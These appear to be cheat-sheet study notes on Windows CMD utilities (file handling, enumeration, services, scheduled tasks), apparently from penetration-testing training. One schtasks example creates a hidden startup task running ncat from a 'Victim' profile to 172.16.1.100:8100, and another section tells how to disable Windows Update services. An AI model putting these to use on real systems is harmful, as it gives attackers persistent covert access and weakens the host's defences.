# CMD.exe Utilities and Important commands

| **Command** | **Description** |
|-------------|-----------------|
| **CMD** |
| `dir` | List the items in the current directory |
| `help <command>` | To view manual of a utility |
| `doskey /history` | [Doskey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/doskey) to view the utilities or commands used prior to this |
| **Robocopy** |
| `robocopy <src_path> <dst_path>` | Basic copy command |
| `robocopy /E /B /L <src_path> <dst_path>` |
| `/E` | Copies subdirectories, including empty ones |
| `/B` | Copies using backup mode i.e. a backup enable user can copy without RO,RW permissions |
| `/L` | Simulates a copy run (tldr. A fake or dummy copy) |
| `robocopy /E /MIR /A-:SH <src_path> <dst_path>` |
| `/MIR` | Mirrors a directory tree |
| `/A-SH` | Excludes files with the attributes System (S) and Hidden (H) |
| `fsutil file createNew <file_name> <permission>` | To create a new file |
| `ren <file> <new_filename>` | Renames a file |
| `>` | write |
| `>>` | append |
| `<` | Input |
| `\|` | To pass the shell output to next command |
| `&` | Runs in succession |
| `&&` | Runs in succession only if the previous is successful |
| `\|\|` | Executes the second if the first fails |
| `del` or `erase` | Removes a file |
| `del /A:<attribute` | Removes a file with specific attributes |
| **Attribute** |
| `R` | Read-only |
| `A` | Archive |
| `S` | System |
| `H` | Hidden |
| `I` | Not Content Indexed |
| `L` | Reparse Points |
| `O` | Offline |
| `P` | Sparse File |
| `T` | Temporary |
| `U` | Unlocked |
| `-` | Use before attributes to exclude them |
|--------------------------------------|----------------------|
| `copy` | To copy files |
| `move` | To move files |
| `/V` | Switch used to give a validation output |
| `whoami /all` | Enumerates all the details of switches `/priv`, `/group` in one |
| `arp /a` | To display the ARP cache |
| `ver` | To display the OS version |
| `hostname` | To display the hostname |
| `systeminfo` | To display all information about the system |
| **Finding Files & Directory** |
| `where` | Equivalent to `locate` in bash |
| `where /R <path>` | Used when the file is not located within the environment path. Wildcards are permitted |
| `find <string> <file>` | To locate phrase in the file |
| `/V` | Displays lines not containing the string |
| `/N` | To display line numbers |
| `/I` | To ignore case-sensitivity |
| `findstr` | To find pattern within the file like `grep` in bash |
| **Compare 2 files** |
| `comp file1 file2` | To compare the similarity between files |
| `fc.exe` | Better and robust|
| `sort` | To sort output |

---

## Variables

- local variables: Only the user where it was set can use it
- global variable: All users on the host can use it

### Managing environment variables

`set` utility only manipulates environment variable in current session
`setx` will make permanent changes to the registry which will be persistent

#### Creating Variables

| **Command** | **Description** |
|-------------|-----------------|
| `set VAR=value` | To set a local variable |
| `echo %VAR%` | To display variable |
| `setx <variable name> <value> <parameters>` | To make persistent variable |
| `setx <variable name> <value>` | To set or reassign the variable, set the value to blank("") to remove it |

---

## Managing Services

refs :
    [WMI](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/07-working-with-wmi?view=powershell-7.4)
    [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)
    [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)

Workflow:
    [Managing Services](https://academy.hackthebox.com/module/167/section/1612)

| **Command** | **Description** |
|-------------|-----------------|
| `sc` | View complete functionality |
| `sc query type= service` | Query all active services |
| `sc query windefend` | Query for windows defender
| `sc stop <service>` | To stop the service |
| `sc start <service>` | To start a service |
| `sc config <service> start= disabled` | To disable a service |

### Services that windows update rely on

| **Service** | **Description** |
|-------------|-----------------|
| `wuauserv` | Windows Update service
| `bits` | Bakground Intellignet Transfer service |

Stop both these services and disable them to stop windows updates

> Set the start type to `auto` to restore functionality

#### Tasklist

| **Command** | **Description** |
|-------------|-----------------|
| `tasklist /svc` | To get a detailed view of all running services |

#### Net utility

| **Command** | **Description** |
|-------|--------|
| `net user` | Displays all the users present on the host, current and deleted |
| `net group` | Displays all the groups in the domain if the user is connected to a Domain controller |
| `net localgroup` | Displays all the groups present locally |
| `net share` | Displays shared resouces on the host |
| `net view` | Displays every shared resources including domain resources, shares, printers, etc |
| `net start <service>` | To start a service |
| `net start` | To view all active services |
| `net stop <service>` | To stop specified service |
| `net pause <service>` | To pause a service |
| `net continue <service>` | To resume a service |

---

## Scheduled Tasks

`schtasks` is the utilty to be used to interact with scheduled tasks

> To access the manual of this utility use command `schtasks /?`

### SCHTASKS

| **Switch** | **Description** |
|---------|------------|
| **Action: /query** | Performs search on remote and local host |
| `/fo` | Sets the format for the output: `csv`, `list`, `table` |
| `/v` | Sets verbosity |
| `/nh` | Removes column headers |
| `/s` | Sets DNS or IP address for the target. Format: `\\\\host` |
| `/u` | Sets user |
| `/p` | Sets password |
| **Action: /create** | Schedule a task |
| `/sc` | Set schedule type. `REQUIRED` |
| `/tn` | Set task name `REQUIRED` |
| `/tr` | Set trigger and task to run `REQUIRED` |
| `/s` | Specify host to run on |
| `/u` | Specify user |
| `/p` | Specify user specific password |
| `/mo` | Allow modifier for the schedule |
| `/rl` | Set privilege limit. `limited` or `highest` |
| `/z` | Set auto deletion |
| `schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"` |
| **Action: /change** | Modify a task |
| `/tn` | Set the task to modify |
| `/tr` | Change the action |
| `/ENABLE` | Enable the schedule |
| `/DISABLE` | Disable the schedule |
| **Action: /delete** | Remove a task from table |
| `/tn` | Set the task name |
| `/s` | Specify name or IP address to delete the task from |
| `/u` | Specify the user |
| `/p` | Specify user-specific password |
| `/f` | Removes confirmation message |

---
